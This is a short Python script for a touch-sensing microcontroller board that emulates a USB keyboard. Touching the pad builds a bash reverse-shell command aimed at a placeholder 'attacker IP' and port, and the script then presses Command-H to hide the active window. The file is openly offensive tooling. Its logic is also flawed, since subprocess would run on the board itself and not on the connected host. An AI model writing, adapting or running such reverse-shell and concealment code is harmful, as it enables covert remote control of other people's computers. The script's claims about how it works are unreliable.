# Execute a reverse shell command that connects to the specified IP and port

import asyncio
import os
import subprocess
import touchio
import board
import neopixel
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Setup touch pin
touch_pin = touchio.TouchIn(board.TOUCH2)
touch_pin.threshold = 23000

# Setup LED pixels
pixel_pin = board.EYES
num_pixels = 2
pixels = neopixel.NeoPixel(pixel_pin, num_pixels, auto_write=False)
green = (0, 255, 0)
red = (255, 0, 0)

# Initialize USB HID devices
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

async def led_updater():
    while True:
        pixels.fill(green if touch_pin.value else red)
        pixels.show()
        await asyncio.sleep(0.5)

async def reverse_shell():
    host = "10.0.0.1"  # Replace with attacker IP address
    port = "8080"      # Replace with the listening port
    # Execute a reverse shell command that connects to the specified IP and port
    command = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
    
    # Run the command in the background
    subprocess.Popen(command, shell=True)

async def touch_loop():
    while True:
        if touch_pin.value:
            print("Touch Activated - Opening Reverse Shell")
            await reverse_shell()

            # Hide terminal window (pseudo command; adjust based on your environment)
            keyboard.press(Keycode.COMMAND, Keycode.H)  # Command-H to hide the active window
            keyboard.release_all()

        await asyncio.sleep(0.1)  # Check touch state every 0.1 seconds

async def main():
    tasks = [
        asyncio.create_task(led_updater()),
        asyncio.create_task(touch_loop())
    ]
    await asyncio.gather(*tasks)

print("Starting")
asyncio.run(main())
